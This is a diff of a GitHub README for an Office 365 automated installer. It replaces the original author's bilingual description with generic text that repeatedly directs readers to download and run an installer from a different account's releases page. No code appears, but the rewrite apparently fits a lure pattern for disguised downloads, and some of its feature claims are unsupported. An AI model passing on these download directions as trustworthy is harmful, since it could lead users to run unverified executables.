@@ -1,183 +1,65 @@
-<a href="https://buymeacoffee.com/abdullaherturk" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
-  
-# Office 365 Enterprise Automated Offline/Online Installer 
+# 🎉 Office-365-Enterprise-Setup - Easy Installer for Office 365
 
-![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge)
-![Tech](https://img.shields.io/badge/Tech-Batch_&_PowerShell-blue?style=for-the-badge)
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/releases)
 
-[![made-for-windows](https://img.shields.io/badge/Made%20for-Windows-00A4E3.svg?style=flat&logo=microsoft)](https://www.microsoft.com/)
-[![Open Source?](https://img.shields.io/badge/Open%20source%3F-Of%20course%21%20%E2%9D%A4-009e0a.svg?style=flat)](https://github.com/abdullah-erturk/Office-365-Enterprise-Setup)
+## 🚀 Getting Started
+This guide will help you download and install the Office 365 Enterprise Offline/Online Installer easily. Follow the steps below.
 
-![sample](https://raw.githubusercontent.com/abdullah-erturk/Office-365-Enterprise-Setup/refs/heads/main/preview.jpg)
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or later
+- **Processor:** 1.6 GHz or faster
+- **Memory:** 4 GB RAM or more
+- **Storage:** Minimum 2 GB of free space
+- **Internet Connection:** Required for online installation and updates
 
----
+## 📂 What is Office-365-Enterprise-Setup?
+Office-365-Enterprise-Setup is an automated installer for Microsoft Office 365. You can set up Office quickly, whether you want to install it offline or online. This tool helps save time by automating the setup process. 
 
-## Link:
+## 📋 Features
+- Automated installation for Office 365
+- Options for both online and offline installs
+- Supports multiple languages
+- Integrates with OneDrive for cloud storage
+- Easy-to-use batch script
 
-[![Stable?](https://img.shields.io/badge/Release-v1.svg?style=flat)](https://codeload.github.com/abdullah-erturk/Office-365-Enterprise-Setup/zip/refs/heads/main)
+## 📅 Release Notes
+Each release includes updates and improvements. Check the release notes on the [Releases page](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/releases) for detailed information on changes and fixes.
 
-<details>
-<summary><strong>Türkçe Tanıtım</strong></summary>
+## 🔗 Download & Install
+To get started, visit the [Releases page](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/releases) to download the latest version of the installer.
 
-  ## 📌 Office 365 Enterprise Otomatik Çevrimdışı / Çevrimiçi Kurulum Aracı (PowerShell Betiği)
+1. Visit the [Releases page](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/releases).
+2. Click on the latest release.
+3. Download the installer file suitable for your system.
 
-Bu powershell uygulaması, Microsoft Office 365 kurulumunu hem çevrimdışı (offline) hem de çevrimiçi (online) olarak otomatikleştirmek için hazırlanmış gelişmiş bir PowerShell betiğidir.
-Kullanıcıların kurmak istediği mimariyi (32-bit / 64-bit) ve dili seçmesine olanak tanır. Betik, kurulum dosyalarının bulunduğu dizini otomatik algılar ve temiz bir Office kurulumu yapar.
+## 🛠️ Installation Steps
+Once you have the installer downloaded, follow these steps:
 
-## ✅ Öne Çıkan Özellikler
+1. Locate the downloaded installer file on your computer.
+2. Double-click the file to start the installation.
+3. Follow the prompts on the screen to proceed.
+4. Choose whether you want to install Office online or offline.
+5. If you select the offline installation, make sure you have enough space and necessary files.
+6. After the installation is complete, launch Office from the Start menu.
 
-✔️ Powershell GUI arayüzü için Türkçe ve İngilizce dil desteği
+## ⚖️ License
+This software is licensed under the MIT License. You are free to use it in compliance with the license terms.
 
-✔️ İsteğe bağlı uygulama seçimi
+## ❓ FAQ
+**Q: Do I need an internet connection to run this installer?**  
+A: Yes, an internet connection is required if you choose the online installation option.
 
-✔️ 43 farklı dilde kurulum desteği
+**Q: Can I install Office 365 on multiple devices?**  
+A: Yes, you can install Office 365 on multiple devices if your subscription allows it.
 
-✔️ Ek ürünler: Visio Pro - Project Pro
+**Q: Is support available if I encounter issues?**  
+A: Please check the issues on the repository or submit your question if you need further assistance.
 
-✔️ Herhangi bir klasör, DVD/ISO, USB veya ağ üzerinden offline kurulum
+## 📢 Community
+Feel free to contribute. Open an issue or submit a pull request on GitHub if you have suggestions or find bugs. Your input helps improve this application.
 
-✔️ Office Deployment Tool ile online ve offline kurulum
+## 📝 Acknowledgments
+Special thanks to all contributors and community members who help make this project better. Your collaboration is invaluable.
 
-✔️ 32-bit / 64-bit otomatik algılama
-
-✔️ Dil klasörünü otomatik algılama (tr-TR, en-US vb.)
-
-✔️ Sessiz kurulum (silent install) seçeneği
-
-✔️ Kurulum süresince ilerleme çubuğu
-
-✔️ Kurulum sonrası doğrulama
-
-✔️ Yönetici yetkisi kontrolü
-
-✔️ Hata yakalama ve loglama
-
-📂 Klasör Yapısı
-```
-│   Office365_Install.bat
-│   autorun.inf
-└───Office
-    │   Check.bat
-    │   ico.ico
-    │   o365.ps1
-    │   setup.exe
-    └───Office365
-        ├───32
-        │   └───tr-TR (veya EN-US vb.)
-        │       └───Office
-        │           └───Data
-        │               │   v32.cab
-        │               │   v32_16.xxxxx.xxxxx.cab
-        │               │
-        │               └────────────────────────16.xxxxx.xxxxx
-        └───64
-            └───tr-TR (veya EN-US vb.)
-                └───Office
-                    └───Data
-                        │   v64.cab
-                        │   v64_16.xxxxx.xxxxx.cab
-                        │
-                        └────────────────────────16.xxxxx.xxxxx
-```
-## 🚀 Kullanım
-
-Yönetici olarak çalıştırın. (Office365_Install.bat dosyası sayesinde otomatik yönetici olarak çalıştırılır)
-
-Dil seçin.
-
-Kurulum otomatik başlatılır. (online veya offline)
-
-## 🧩 Gereksinimler
-
-Windows 10 / Windows 11 / Server (Minimum Server versiyonu: Windows Server 2012 R2)
-
-Yönetici yetkisi
-
-PowerShell 5.1 veya üstü
-
-</details>
-
----
-
-<details>
-<summary><strong>English Description</strong></summary>
-
-  ## 📌 Office 365 Enterprise Automated Offline/Online Installer (PowerShell Script)
-
-This powershell application is a fully automated, user-friendly PowerShell script designed to install Microsoft Office 365 in both offline and online modes.
-It allows users to choose the preferred architecture (32-bit or 64-bit) and the installation language dynamically. The script automatically detects the correct folder structure and initiates a clean Office deployment using your pre-downloaded installation files.
-
-## ✅ Key Features
-
-✔️ Turkish and English language support for the powershell GUI interface
-
-✔️ Optional application selection
-
-✔️ Installation support in 43 different languages
-
-✔️ Additional products: Visio Pro - Project Pro
-
-✔️ Supports offline installation from any folder, DVD/ISO, USB, or network path
-
-✔️ Online and offline installation with Office Deployment Tool
-
-✔️ Automatic detection of architecture (x86 / x64)
-
-✔️ Automatic detection of language folder (e.g., tr-TR, en-US, etc.)
-
-✔️ Clean and silent installation option
-
-✔️ Progress bar during installation
-
-✔️ Post-installation verification
-
-✔️ Admin privilege auto-check
-
-✔️ Error handling and detailed logs
-
-## 📂 Folder Structure
-```
-│   Office365_Install.bat
-│   autorun.inf
-└───Office
-    │   Check.bat
-    │   ico.ico
-    │   o365.ps1
-    │   setup.exe
-    └───Office365
-        ├───32
-        │   └───tr-TR (or en-US etc.)
-        │       └───Office
-        │           └───Data
-        │               │   v32.cab
-        │               │   v32_16.xxxxx.xxxxx.cab
-        │               │
-        │               └────────────────────────16.xxxxx.xxxxx
-        └───64
-            └───tr-TR (or en-US etc.)
-                └───Office
-                    └───Data
-                        │   v64.cab
-                        │   v64_16.xxxxx.xxxxx.cab
-                        │
-                        └────────────────────────16.xxxxx.xxxxx
-```
-## 🚀 Usage
-
-Run as Administrator. (Automatically runs as administrator thanks to the Office365_Install.bat file)
-
-Choose anguage.
-
-Installation starts automatically. (online or offline)
-
-## 🧩 Requirements
-
-Windows 10 / 11 / Server (Minimum Server version: Windows Server 2012 R2)
-
-Administrator privileges
-
-PowerShell 5.1 or higher
-
-</details>
-
-
+For more information, visit the [Releases page](https://github.com/Dhanloyd/Office-365-Enterprise-Setup/releases) and download Office-365-Enterprise-Setup now.
